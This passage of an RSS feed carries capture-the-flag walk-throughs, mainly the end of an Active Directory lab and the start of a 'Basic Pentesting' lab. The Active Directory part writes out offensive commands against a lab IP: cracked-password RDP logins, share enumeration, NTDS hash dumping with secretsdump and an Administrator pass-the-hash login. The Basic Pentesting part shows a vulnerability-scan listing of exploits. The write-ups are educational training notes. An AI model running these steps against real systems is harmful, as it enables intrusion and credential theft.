&lt;span id=&quot;cb9-3&quot;&gt;&lt;a href=&quot;#cb9-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;           &lt;span class=&quot;ex&quot;&gt;passwordlist.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This reveals that the password for the &lt;code&gt;svc-admin&lt;/code&gt; account is &lt;code&gt;management2005&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Before moving on, we'll connect to the target as &lt;code&gt;svc-admin&lt;/code&gt; using XFreeRDP to get the first flag.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb10&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb10-1&quot;&gt;&lt;a href=&quot;#cb10-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xfreerdp&lt;/span&gt; /dynamic-resolution +clipboard /cert:ignore &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-2&quot;&gt;&lt;a href=&quot;#cb10-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /v:&lt;span class=&quot;ex&quot;&gt;10.10.177.198&lt;/span&gt; /u:svc-admin /p:management2005&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This flag is in a file called &lt;code&gt;user.txt&lt;/code&gt; on &lt;code&gt;svc-admin&lt;/code&gt;'s desktop.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://blog.certcube.com/as-rep-roasting-attack/&quot;&gt;Kerberoasting initial: AS-REP Roasting&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Impacket.md&quot;&gt;Using Impacket&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/Sq00ky/attacktive-directory-tools/blob/master/passwordlist.txt&quot;&gt;attacktive-directory-tools / passwordlist.txt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;hashcat: Example hashes&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20XFreeRDP.md&quot;&gt;Using XFreeRDP&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;back-to-the-basics&quot;&gt;Back to the Basics&lt;/h2&gt;&lt;p&gt;We're going to drop down and use smbclient to enumerate potential shares on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the &lt;code&gt;-L&lt;/code&gt; switch).&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb11&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb11-1&quot;&gt;&lt;a href=&quot;#cb11-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;smbclient&lt;/span&gt; -L THM-AD -I 10.10.177.198 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-2&quot;&gt;&lt;a href=&quot;#cb11-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-U&lt;/span&gt; svc-admin%management2005&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gives us the following output.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to THM-AD failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There's six shares, but only five of these are disks. We'll poke around a bit using &lt;code&gt;smbclient //THM-AD/${SHARENAME} -I 10.10.177.198 -U svc-admin%management2005&lt;/code&gt;; as one might guess, //THM-AD/backup contains a &lt;code&gt;backup_credentials.txt&lt;/code&gt; file.&lt;/p&gt;&lt;p&gt;The contents of this file naively appear to be base64 encoded, and indeed piping it through &lt;code&gt;base64 -d&lt;/code&gt; reveals that the password for the &lt;code&gt;backup&lt;/code&gt; account is &lt;code&gt;backup2517860&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;We'll again pause to connect to the target as &lt;code&gt;backup&lt;/code&gt; to get the second flag.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb13&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb13-1&quot;&gt;&lt;a href=&quot;#cb13-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xfreerdp&lt;/span&gt; /dynamic-resolution +clipboard /cert:ignore &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-2&quot;&gt;&lt;a href=&quot;#cb13-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /v:&lt;span class=&quot;ex&quot;&gt;10.10.177.198&lt;/span&gt; /u:backup /p:backup2517860&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This flag is in a file called &lt;code&gt;PrivEsc&lt;/code&gt; on &lt;code&gt;backup&lt;/code&gt;'s desktop.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Enumerate%20Samba%20Users%20and%20Shares.md&quot;&gt;Enumerate Samba Users and Shares&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;elevating-privileges-within-the-domain&quot;&gt;Elevating Privileges Within the Domain&lt;/h2&gt;&lt;p&gt;The CTF now reveals that the &lt;code&gt;backup&lt;/code&gt; account has all AD changes synced to it, including NT hashes, and that we can use Impacket's secretsdump.py file to obtain these from NTDS.DIT.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb14&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb14-1&quot;&gt;&lt;a href=&quot;#cb14-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-2&quot;&gt;&lt;a href=&quot;#cb14-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;/usr/share/doc/python3-impacket/examples/secretsdump.py&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-3&quot;&gt;&lt;a href=&quot;#cb14-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;-dc-ip&lt;/span&gt; 10.10.177.198 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-4&quot;&gt;&lt;a href=&quot;#cb14-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;-target-ip&lt;/span&gt; 10.10.177.198 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-5&quot;&gt;&lt;a href=&quot;#cb14-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;spookysec.local&lt;/span&gt;/backup:&lt;span class=&quot;ex&quot;&gt;backup2517860@THM-AD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(I got a bit tripped up here, as I didn't read secretsdump.py's output carefully enough â credentials are presented in the format &lt;code&gt;domain\uid:rid:lmhash:nthash&lt;/code&gt;, so the relevant NTLM hash is the &lt;em&gt;last&lt;/em&gt; hash for the &lt;code&gt;Administrator&lt;/code&gt; account!)&lt;/p&gt;&lt;p&gt;We'll use the Evil-WinRM tool to retrieve the final flag by passing the hash.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb15&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb15-1&quot;&gt;&lt;a href=&quot;#cb15-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;evil-winrm&lt;/span&gt; --ip 10.10.177.198 --user Administrator &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb15-2&quot;&gt;&lt;a href=&quot;#cb15-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;           &lt;span class=&quot;ex&quot;&gt;--hash&lt;/span&gt; 0e0363213e37b94221497260b0bcb4fc&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The final flag is in a file called &lt;code&gt;root.txt&lt;/code&gt; on the &lt;code&gt;Administrator&lt;/code&gt; account's desktop.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot;&gt;Pass the hash (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 2 h 38 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/attacktivedirectory&quot;&gt;TryHackMe: Attacktive Directory&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Attacktive%20Directory.md</guid>
		</item>
		<item>
			<title>Bandit</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Bandit.md</link>
			<description>&lt;h2 id=&quot;bandit-2&quot;&gt;Bandit 2&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Read%20a%20File%20Beginning%20With%20a%20Dash%20%28-%29.md&quot;&gt;Read a File Beginning With a Dash (-)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;bandit-13&quot;&gt;Bandit 13&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22xxd%22.md&quot;&gt;Using &quot;xxd&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;bandit-16&quot;&gt;Bandit 16&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Send%20a%20Command%20Using%20OpenSSL.md&quot;&gt;Send a Command Using OpenSSL&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;bandit-26&quot;&gt;Bandit 26&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Force%20%22more%22%20Into%20Interactive%20Mode.md&quot;&gt;Force &quot;more&quot; Into Interactive Mode&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Jump%20to%20an%20Editor%20in%20%22more%22.md&quot;&gt;Jump to an Editor in &quot;more&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Set%20a%20Shell%20in%20ViM.md&quot;&gt;Set a Shell in ViM&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://overthewire.org/wargames/bandit/&quot;&gt;OverTheWire: Bandit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Bandit.md</guid>
		</item>
		<item>
			<title>Basic Pentesting</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Basic%20Pentesting.md</link>
			<description>&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;&lt;p&gt;The description of this CTF is sparse, but the goal seems to be to (1) enumerate the services on a machine, (2) brute force a login over SSH, and (3) elevate privileges (presumably to root, but things are a little vague here).&lt;/p&gt;&lt;p&gt;For this attempt, the target machine IP is 10.10.74.250.&lt;/p&gt;&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;&lt;p&gt;We begin by running a full nmap scan:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -vv -oA basic-pentesting -A -sS --script vuln &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.74.250&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Nov  4 19:56:42 2021 as: nmap -vv -oA basic-pentesting -A -sS --script vuln -p- 10.10.74.250
Increasing send delay for 10.10.74.250 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.74.250 from 10 to 20 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.74.250
Host is up, received timestamp-reply ttl 61 (0.17s latency).
Scanned at 2021-11-04 19:56:54 MDT for 1378s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070  7.8 https://vulners.com/packetstorm/PACKETSTORM:140070  *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8 https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
|       EDB-ID:40888    7.8 https://vulners.com/exploitdb/EDB-ID:40888  *EXPLOIT*
|       CVE-2016-8858   7.8 https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8 https://vulners.com/cve/CVE-2016-6515
|       1337DAY-ID-26494    7.8 https://vulners.com/zdt/1337DAY-ID-26494    *EXPLOIT*
|       SSV:92579   7.5 https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2016-10009  7.5 https://vulners.com/cve/CVE-2016-10009
|       1337DAY-ID-26576    7.5 https://vulners.com/zdt/1337DAY-ID-26576    *EXPLOIT*
|       SSV:92582   7.2 https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2016-10012  7.2 https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2 https://vulners.com/cve/CVE-2015-8325
|       SSV:92580   6.9 https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2016-10010  6.9 https://vulners.com/cve/CVE-2016-10010
|       1337DAY-ID-26577    6.9 https://vulners.com/zdt/1337DAY-ID-26577    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-25017/    5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/ *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8 https://vulners.com/exploitdb/EDB-ID:46516  *EXPLOIT*
|       CVE-2019-6111   5.8 https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328    5.8 https://vulners.com/zdt/1337DAY-ID-32328    *EXPLOIT*
|       1337DAY-ID-32009    5.8 https://vulners.com/zdt/1337DAY-ID-32009    *EXPLOIT*
|       SSV:91041   5.5 https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019  5.5 https://vulners.com/packetstorm/PACKETSTORM:140019  *EXPLOIT*
|       PACKETSTORM:136234  5.5 https://vulners.com/packetstorm/PACKETSTORM:136234  *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5 https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5 https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5 https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
|       EDB-ID:40858    5.5 https://vulners.com/exploitdb/EDB-ID:40858  *EXPLOIT*
|       CVE-2016-3115   5.5 https://vulners.com/cve/CVE-2016-3115
|       SSH_ENUM    5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT*
|       PACKETSTORM:150621  5.0 https://vulners.com/packetstorm/PACKETSTORM:150621  *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS  *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0 https://vulners.com/exploitdb/EDB-ID:45939  *EXPLOIT*
|       CVE-2018-15919  5.0 https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0 https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0 https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0 https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730    5.0 https://vulners.com/zdt/1337DAY-ID-31730    *EXPLOIT*
|       EDB-ID:45233    4.6 https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       EDB-ID:40963    4.6 https://vulners.com/exploitdb/EDB-ID:40963  *EXPLOIT*
|       EDB-ID:40962    4.6 https://vulners.com/exploitdb/EDB-ID:40962  *EXPLOIT*
|       CVE-2021-41617  4.4 https://vulners.com/cve/CVE-2021-41617
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3 https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3 https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
|       CVE-2020-14145  4.3 https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-6210   4.3 https://vulners.com/cve/CVE-2016-6210
|       1337DAY-ID-25440    4.3 https://vulners.com/zdt/1337DAY-ID-25440    *EXPLOIT*
|       1337DAY-ID-25438    4.3 https://vulners.com/zdt/1337DAY-ID-25438    *EXPLOIT*
|       CVE-2019-6110   4.0 https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0 https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6 https://vulners.com/cve/CVE-2018-20685
|       SSV:92581   2.1 https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2016-10011  2.1 https://vulners.com/cve/CVE-2016-10011
|       PACKETSTORM:151227  0.0 https://vulners.com/packetstorm/PACKETSTORM:151227  *EXPLOIT*
|       PACKETSTORM:140261  0.0 https://vulners.com/packetstorm/PACKETSTORM:140261  *EXPLOIT*
|       PACKETSTORM:138006  0.0 https://vulners.com/packetstorm/PACKETSTORM:138006  *EXPLOIT*
|       PACKETSTORM:137942  0.0 https://vulners.com/packetstorm/PACKETSTORM:137942  *EXPLOIT*
|       EDB-ID:46193    0.0 https://vulners.com/exploitdb/EDB-ID:46193  *EXPLOIT*
|       EDB-ID:40136    0.0 https://vulners.com/exploitdb/EDB-ID:40136  *EXPLOIT*
|       EDB-ID:40113    0.0 https://vulners.com/exploitdb/EDB-ID:40113  *EXPLOIT*
|       EDB-ID:39569    0.0 https://vulners.com/exploitdb/EDB-ID:39569  *EXPLOIT*
|       1337DAY-ID-30937    0.0 https://vulners.com/zdt/1337DAY-ID-30937    *EXPLOIT*
|_      1337DAY-ID-10010    0.0 https://vulners.com/zdt/1337DAY-ID-10010    *EXPLOIT*
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
| http-enum: 
|_  /development/: Potentially interesting directory w/ listing on &amp;#39;apache/2.4.18 (ubuntu)&amp;#39;
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&amp;#39;t find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2021-39275  7.5 https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5 https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5 https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5 https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5 https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5 https://vulners.com/cve/CVE-2017-3167
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/  7.2 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/   *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2 https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       CVE-2019-0211   7.2 https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502    7.2 https://vulners.com/zdt/1337DAY-ID-32502    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/    *EXPLOIT*
